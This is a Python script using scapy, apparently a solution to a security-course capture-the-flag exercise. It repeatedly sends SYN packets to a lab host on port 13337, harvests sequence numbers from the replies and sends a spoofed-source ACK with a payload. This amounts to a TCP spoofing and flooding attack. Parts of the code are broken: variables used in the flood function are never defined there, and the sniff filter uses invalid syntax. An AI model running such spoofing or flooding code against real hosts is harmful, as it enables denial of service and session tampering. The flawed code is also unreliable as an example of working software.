from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
import argparse
import time
import socket
import netifaces as ni

def syn_flood(model, network_interface):
    ip_syn = IP(dst=model['dest_ip'])
    payload = "flagit"
    
    while True:
        tcp_syn = TCP(sport=0, dport=model["dport"], flags="S")
        pkt = ip_syn/tcp_syn/payload
        ans, unans = sr(pkt, multi=1, timeout=1)
        ans.show()
        # 1. FIND SYN-ACK PACKET in ans and extract the seq number
        last_request, last_answer = ans[-1]
        seq = last_answer[TCP].seq
        ack = last_answer[TCP].ack
        # # 2. Send ACK packet with seq number + 1
        ip_spoof = IP(src=model["src"], dst=dest_ip)
        tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=ack, ack=seq + 1, flags="A")
        # # 3. Send payload
        new_pkt = ip_spoof/tcp_spoof/target_ip
        send(new_pkt)
        time.sleep(1)

def print_pkt(pkt):
    print(pkt.summary())

def sniff_packets(model, network_interface):
    print("Sniffing packets", model, network_interface)
    sniff(filter="tcp and port 13337 and tcp.flags.syn 1 and tcp.flags.ack 1", prn=print_pkt)

def main_tcp(network_interface):
    model = {
        "src": "10.2.4.10",
        "dst": "flagit.cse543.rev.fish",
        "dport": 13337,
        "target_ip": None,
        "dest_ip": None
    }
    target_ip = ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
    dest_ip = socket.gethostbyname(model["dst"])
    model["target_ip"] = target_ip
    model["dest_ip"] = dest_ip

    with ThreadPoolExecutor(max_workers=2) as executor:
        executor.submit(syn_flood, model, network_interface)
        executor.submit(sniff_packets, model, network_interface)

if __name__ == "__main__":
    network_interface = "tap0"
    main_tcp(network_interface=network_interface)
    